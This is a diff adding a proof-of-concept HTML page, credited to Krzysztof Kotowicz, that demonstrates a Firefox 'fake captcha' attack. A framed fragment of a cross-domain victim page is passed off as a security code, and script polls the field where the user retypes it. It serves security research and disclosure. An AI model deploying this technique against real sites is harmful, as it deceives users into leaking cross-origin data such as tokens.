@@ -1,0 +1,199 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<script
+	src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
+
+<style>
+#register {
+	width: 400px;
+	padding: 10px;
+	margin: 10px;
+	border: 1px dashed blue;
+}
+
+p {
+	margin: 0.1em;
+}
+
+iframe#one {
+	margin: 0;
+	padding: 0;
+	width: 9em;
+	height: 1em;
+	border: 2px inset black;
+	font: normal 13px/14px monospace;
+	display: inline-block;
+}
+
+iframe#one.reveal {
+	width: 90em;
+	height: 15em;
+}
+
+input {
+	margin: 10px 0;
+	padding: 0;
+	font-size: 1em;
+	width: 9em;
+	height: 1em;
+	display: inline-block;
+	border: 2px inset black;
+	font: normal 13px/14px monospace;
+}
+
+#dwa {
+	display: none;
+	border: none;
+	width: 100%;
+	height: 300px;
+}
+
+label {
+	display: inline-block;
+	width: 200px;
+}
+
+sup {
+	color: red;
+}
+
+#cpl {
+	width: 25%;
+	position: fixed;
+	right: 10px;
+	top: 10px;
+	background-color: rgba(255, 255, 255, .5);
+}
+
+#header {
+	border-bottom: 1px solid #ccc;
+	width: 70%;
+}
+
+body,html {
+	margin: 0;
+	padding: 0;
+}
+</style>
+</head>
+<body>
+	<div id="header">
+		<h1>Cross domain content extraction with line &amp; column
+			positioning</h1>
+		<p>
+			by <a rel=me href="http://blog.kotowicz.net">Krzysztof Kotowicz</a>
+		</p>
+		<p>Firefox only</p>
+		<p>
+			More info: <a href="http://html5sec.org/#119">html5sec.org vector</a>
+		</p>
+	</div>
+	<form id=cpl>
+		<fieldset>
+			<legend>Control panel</legend>
+			<p>
+				<a id=url target=_blank>victim page</a>
+			</p>
+			<p>
+				Line: <input id=line size=3 value=7>
+			<p>
+				Column: <input id=col size=3 value=19>
+				<button type=button id=reposition>Reposition frame</button>
+				<button type=button id=show>Show/hide frame</button>
+				<br>
+		</fieldset>
+	</form>
+	<div id=register>
+		<p>
+			<small>To protect against spam, please retype the below
+				security code:</small>
+		</p>
+		<p>
+			<label>Security code:</label><iframe id=one scrolling=no></iframe>
+		</p>
+		<p>
+			<label>Repeat security code: </label><input id=a value=""
+				style="color: #999" autocomplete="off">
+		</p>
+		<p>
+			<label></label>
+			<button type=button>Register</button>
+		</p>
+	</div>
+
+	<script>
+		$(function() {
+
+			String.prototype.width = function(font) {
+				var o = $('<pre>' + this + '</pre>').css({
+					'position' : 'absolute',
+					'float' : 'left',
+					'visibility' : 'hidden'
+				}).appendTo($('body')), w = o.width();
+
+				o.remove();
+
+				return w;
+			}
+
+			String.prototype.height = function(font) {
+				var o = $('<pre>' + this + '</pre>').css({
+					'position' : 'absolute',
+					'float' : 'left',
+					'visibility' : 'hidden'
+				}).appendTo($('body')), w = o.height();
+
+				o.remove();
+
+				return w;
+			}
+
+			// measure char width
+			var char_width = '1234567890'.width() / 10;
+			$('#one,#a').width(16 * char_width);
+			//$('#one').width(16 * char_width);
+            
+			var line_height = '1\n2\n3\n4\n5\n6\n7\n8\n9\n0'.height() / 10;
+
+			function reposition(line, col) {
+				var host = location.host.replace('attacker', 'victim');
+				var url = 'http://' + host + '/fake-captcha/victim.html?'
+						+ Math.random();
+
+				$("#url").attr('href', url);
+				$('#one').attr(
+						'src',
+						'outer.html?' + Math.random() + '#' + char_width + ":"
+								+ line_height + ':' + line + ":" + col + ':'
+								+ url);
+			}
+
+			$("#reposition").click(
+					function() {
+						reposition(parseInt($('#line').val(), 10), parseInt($(
+								'#col').val(), 10));
+					});
+
+			$("#show").click(function() {
+				$("#one").toggleClass('reveal');
+			});
+
+			var capture = function() {
+				var a, t = document.getElementById('a');
+
+				if (!t.value || t.value.match('^\s*$'))
+					return;
+
+				alert(t.value);
+				t.value = '';
+			};
+
+			$("#reposition").click();
+			setInterval(capture, 10);
+		})
+	</script>
+	<iframe id=dwa>loading...</iframe>
+</body>
+</html>
